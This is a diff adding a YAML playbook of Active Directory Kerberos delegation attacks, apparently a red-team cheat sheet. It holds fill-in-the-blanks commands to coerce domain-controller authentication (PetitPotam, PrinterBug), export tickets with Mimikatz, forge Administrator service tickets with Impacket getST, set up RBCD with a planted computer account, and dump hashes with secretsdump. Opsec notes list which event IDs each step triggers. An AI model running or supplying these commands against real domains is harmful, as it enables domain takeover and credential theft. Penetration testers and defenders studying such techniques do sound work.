@@ -1,0 +1,137 @@
+# Delegation Abuse Commands
+# Attacks: Unconstrained, Constrained, RBCD
+
+Unconstrained:
+  description: "Unconstrained delegation - capture TGTs from connecting users"
+  commands:
+    - name: "Monitor for TGTs (requires local admin)"
+      tool: Rubeus
+      command: |
+        Rubeus.exe monitor /interval:5 /nowrap
+    - name: "Coerce DC authentication (PetitPotam)"
+      tool: PetitPotam
+      command: |
+        python3 PetitPotam.py -d '<DOMAIN>' -u '<USERNAME>' -p '<PASSWORD>' <UNCONSTRAINED_HOST> <DC_IP>
+    - name: "Coerce DC authentication (PrinterBug)"
+      tool: Impacket
+      command: |
+        python3 printerbug.py '<DOMAIN>/<USERNAME>:<PASSWORD>'@<DC_IP> <UNCONSTRAINED_HOST>
+    - name: "Extract TGT from memory"
+      tool: Mimikatz
+      command: |
+        sekurlsa::tickets /export
+    - name: "Pass-the-ticket"
+      tool: Impacket
+      command: |
+        export KRB5CCNAME=/path/to/ticket.ccache
+        secretsdump.py -k -no-pass <DC_FQDN>
+  opsec:
+    - "Requires local admin on unconstrained delegation host"
+    - "Coercion creates Event ID 5145 on target"
+    - "TGT in memory until ticket expires"
+
+Constrained:
+  description: "Constrained delegation - impersonate users to allowed services"
+  commands:
+    - name: "Request TGT for delegating account"
+      tool: Impacket
+      command: |
+        getTGT.py -dc-ip <DC_IP> '<DOMAIN>/<DELEGATING_ACCOUNT>:<PASSWORD>'
+    - name: "S4U2Self + S4U2Proxy to target service"
+      tool: Impacket
+      command: |
+        getST.py -spn '<TARGET_SPN>' -impersonate Administrator -dc-ip <DC_IP> '<DOMAIN>/<DELEGATING_ACCOUNT>:<PASSWORD>'
+    - name: "Use ticket to access service"
+      tool: Impacket
+      command: |
+        export KRB5CCNAME=Administrator.ccache
+        secretsdump.py -k -no-pass <TARGET_FQDN>
+    - name: "Alternative service abuse (if CIFS allowed)"
+      tool: Impacket
+      command: |
+        getST.py -spn 'cifs/<TARGET_FQDN>' -impersonate Administrator -dc-ip <DC_IP> '<DOMAIN>/<DELEGATING_ACCOUNT>:<PASSWORD>'
+  opsec:
+    - "Creates Kerberos Event IDs 4768, 4769"
+    - "S4U extensions visible in tickets"
+    - "Alternative service name may bypass SPN restrictions"
+
+ConstrainedWithProtocolTransition:
+  description: "Constrained delegation with protocol transition - S4U2Self without prior auth"
+  commands:
+    - name: "Request TGS for any user without authentication"
+      tool: Impacket
+      command: |
+        getST.py -spn '<TARGET_SPN>' -impersonate Administrator -dc-ip <DC_IP> '<DOMAIN>/<DELEGATING_ACCOUNT>$:<HASH>'
+    - name: "Use ticket"
+      tool: Impacket
+      command: |
+        export KRB5CCNAME=Administrator.ccache
+        secretsdump.py -k -no-pass <TARGET_FQDN>
+  opsec:
+    - "Protocol transition allows impersonation without user interaction"
+    - "TRUSTED_TO_AUTH_FOR_DELEGATION flag enables this"
+
+RBCD:
+  description: "Resource-Based Constrained Delegation - configure delegation from controlled account"
+  commands:
+    - name: "Add computer account (if MAQ > 0)"
+      tool: Impacket
+      command: |
+        addcomputer.py -computer-name 'YOURPC$' -computer-pass 'Password123!' -dc-ip <DC_IP> '<DOMAIN>/<USERNAME>:<PASSWORD>'
+    - name: "Configure RBCD on target"
+      tool: Impacket
+      command: |
+        rbcd.py -delegate-to '<TARGET>$' -delegate-from 'YOURPC$' -dc-ip <DC_IP> '<DOMAIN>/<USERNAME>:<PASSWORD>'
+    - name: "Get service ticket as Administrator"
+      tool: Impacket
+      command: |
+        getST.py -spn 'cifs/<TARGET_FQDN>' -impersonate Administrator -dc-ip <DC_IP> '<DOMAIN>/YOURPC$:Password123!'
+    - name: "Use ticket to access target"
+      tool: Impacket
+      command: |
+        export KRB5CCNAME=Administrator.ccache
+        secretsdump.py -k -no-pass <TARGET_FQDN>
+  opsec:
+    - "Computer account creation creates Event ID 4741"
+    - "RBCD configuration modifies msDS-AllowedToActOnBehalfOfOtherIdentity"
+    - "Modification creates Event ID 5136"
+
+AllowedToDelegate:
+  User:
+    description: "User with constrained delegation rights"
+    commands:
+      - name: "S4U attack with user credentials"
+        tool: Impacket
+        command: |
+          getST.py -spn '<TARGET_SPN>' -impersonate Administrator -dc-ip <DC_IP> '<DOMAIN>/<TARGET>:<PASSWORD>'
+          export KRB5CCNAME=Administrator.ccache
+          secretsdump.py -k -no-pass <TARGET_HOST>
+    opsec:
+      - "Requires knowledge of user's password or hash"
+
+  Computer:
+    description: "Computer with constrained delegation rights"
+    commands:
+      - name: "S4U attack with computer hash"
+        tool: Impacket
+        command: |
+          getST.py -spn '<TARGET_SPN>' -impersonate Administrator -dc-ip <DC_IP> '<DOMAIN>/<TARGET>$:<HASH>'
+          export KRB5CCNAME=Administrator.ccache
+          secretsdump.py -k -no-pass <TARGET_HOST>
+    opsec:
+      - "Requires computer account hash (from SAM, NTDS, etc.)"
+
+AllowedToAct:
+  Computer:
+    description: "Computer allows RBCD from other accounts"
+    commands:
+      - name: "Check who can delegate"
+        tool: bloodyAD
+        command: |
+          bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> get object '<TARGET>$' --attr msDS-AllowedToActOnBehalfOfOtherIdentity
+      - name: "Get TGS using allowed account"
+        tool: Impacket
+        command: |
+          getST.py -spn 'cifs/<TARGET_FQDN>' -impersonate Administrator -dc-ip <DC_IP> '<DOMAIN>/<ALLOWED_ACCOUNT>$:<HASH>'
+    opsec:
+      - "Need to control an account in the allowed list"
